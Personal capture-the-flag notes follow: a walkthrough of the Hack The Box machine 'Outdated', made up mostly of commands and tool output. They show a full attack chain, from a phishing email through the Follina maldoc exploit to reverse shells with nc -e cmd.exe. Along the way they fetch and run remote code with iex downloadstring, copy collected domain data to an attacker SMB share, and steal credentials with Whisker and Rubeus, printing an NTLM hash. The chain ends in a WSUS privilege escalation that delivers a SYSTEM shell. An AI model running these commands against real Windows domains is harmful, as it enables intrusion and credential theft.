* https://0xdf.gitlab.io/2022/12/10/htb-outdated.html
* https://mostxeon.github.io/posts/outdated/

# Enum
### SMB
```bash
smbmap -H $IP -u null -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.115.60:445       Name: outdated.htb              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        UpdateServicesPackages                                  NO ACCESS       A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent                                             NO ACCESS       A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.
        ```

### email port 25
```bash
sendemail -f evil@as.com -t itsupport@outdated.htb -u "Test msg 01" -m "http://10.10.16.12/" -s 10.129.115.60:25
Dec 05 14:53:19 kali sendemail[22179]: Email was sent successfully!

nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.115.60] 49855
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.906 <- Vulnerable to CVE-2022-30190
Host: 10.10.16.12
Connection: Keep-Alive

swaks --to itsupport@outdated.htb --from as@htb --server mail.outdated.htb --body "http://10.10.16.12/"
```

# Foothold
```bash
python follina.py --interface 10.10.16.12 --port 80 --reverse 443
[+] copied staging doc /tmp/18c68epb
[+] created maldoc ./follina.doc
[+] serving html payload on :80
[+] starting 'nc -lvnp 443' 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.38.195] 49794
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\btables\AppData\Local\Temp\SDIAG_ca91cf97-8b33-4a79-81eb-21e91f1e457b>hostname
client
```

### Enum
```cmd
C:\Users\btables\AppData\Local\Temp\SDIAG_ca91cf97-8b33-4a79-81eb-21e91f1e457b>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.20.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.20.1
```

That’s not the public IP I emailed. I must be in a container. `systeminfo` show that the box is a part of the `outdated.htb` domain:

##### SharpHound exe or ps1
```cmd
iwr http://10.10.16.12:8000/SharpHound.exe -o sh.exe 
.\sh.exe -C all

iwr http://10.10.16.12:8000/SharpHound.ps1 -o sh.ps1 
. .\sh.ps1
Invoke-BloodHound -CollectionMethod All							<- .exe is more stable
Invoke-BloodHound -CollectionMethod All -Domain outdated.htb 	<- It failed to compress the data to zip
```

```bash
impacket-smbserver as . -smb2support

(-user username_optional -pass pass_optional)
```

```cmd
PS C:\windows\tasks> net use \\10.10.16.12\as         <- Optional /u:username_optional pass_optional
net use \\10.10.16.12\as
The command completed successfully.

PS C:\windows\tasks> copy 20231206002250_BloodHound.zip \\10.10.16.12\as\
copy 20231206002250_BloodHound.zip \\10.10.16.12\as\
```

##### Whisker
```cmd
iex(new-object net.webclient).downloadstring('http://10.10.16.12:8000/Invoke-Whisker.ps1')

Invoke-Whisker -command "add /target:SFLOWERS"


iex(new-object net.webclient).downloadstring('http://10.10.16.12:8000/Invoke-Rubeus.ps1')

`iex` no need for Import-Module since it doesn't even store the file

iwr http://10.10.16.12:8000/Invoke-Rubeus.ps1 -o Invoke-Rubeus.ps1 
```

Making the format right `/password:jAL5LUrOuu29CsKm` by remove double quotes
```cmd
Invoke-Rubeus -Command "asktgt /user:SFLOWERS /certificate:MIIJuAIBAz<SNIP>J7EAICB9A= /password:jAL5LUrOuu29CsKm /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show"

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=SFLOWERS 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\SFLOWERS'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF0jCC..SNIP..QuaHRi

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  SFLOWERS
  UserRealm                :  OUTDATED.HTB
  StartTime                :  12/6/2023 1:39:56 AM
  EndTime                  :  12/6/2023 11:39:56 AM
  RenewTill                :  12/13/2023 1:39:56 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  +tnDbpTPd1Oa4su7gJKHiw==
  ASREP (key)              :  BCCEEA9408022B0FA422045FFF767A30

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

# Root
### Enum
Winpeas show the WSUS attack.* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
*Evil-WinRM* PS C:\Users\sflowers\Desktop> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    http://wsus.outdated.htb:8530

*Evil-WinRM* PS C:\Users\sflowers\Desktop> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
    UseWUServer    REG_DWORD    0x1
```

### Exploit
```cmd
*Evil-WinRM* PS C:\Users\sflowers\Desktop> Invoke-SharpWSUS inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.outdated.htb, 172.16.20.1, 10.0.17763.1432, 12/6/2023 5:50:54 AM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete
```

##### FQDN
```cmd
*Evil-WinRM* PS C:\Windows\System32\WindowsPowerShell\v1.0> [System.Net.Dns]::GetHostByName($env:computerName)
*Evil-WinRM* PS C:\Windows\System32\WindowsPowerShell\v1.0> [System.Net.Dns]::GetHostByName($env:computerName).HostName
DC.outdated.htb

HostName        Aliases AddressList
--------        ------- -----------
DC.outdated.htb {}      {10.129.38.195, 172.16.20.1}
```

##### Done by .exe or .ps1
Convert it as .exe if needed
```bash
cat Invoke-SharpWSUS-ps1_b64 | base64 -d > SharpWSUS.gz
gzip -d SharpWSUS.gz
```

```cmd
start-process .\nc64.exe -args "-e cmd.exe 10.10.16.12 9001"

iwr http://10.10.16.12:9000/SharpWSUS.exe -o SharpWSUS.exe
iwr http://10.10.16.12:9000/PsExec64.exe -o PsExec64.exe

.\SharpWSUS.exe create /payload:"C:\Users\sflowers\Documents\PsExec64.exe" /args:"-accepteula -s -d C:\\Users\\sflowers\\Documents\\nc64.exe -e cmd.exe 10.10.16.12 9002" /title:"evil01"


.\SharpWSUS.exe approve /updateid:fcedda94-69ce-4ab8-85dd-ab1e4bcd3e94 /computername:DC.outdated.htb /groupname:"Evil Group 01"

.\SharpWSUS.exe check /updateid:fcedda94-69ce-4ab8-85dd-ab1e4bcd3e94 /computername:DC.outdated.htb
```

Or just the `.ps1`

`iex(new-object net.webclient).downloadstring('http://10.10.16.12:8000/Invoke-SharpWSUS.ps1')`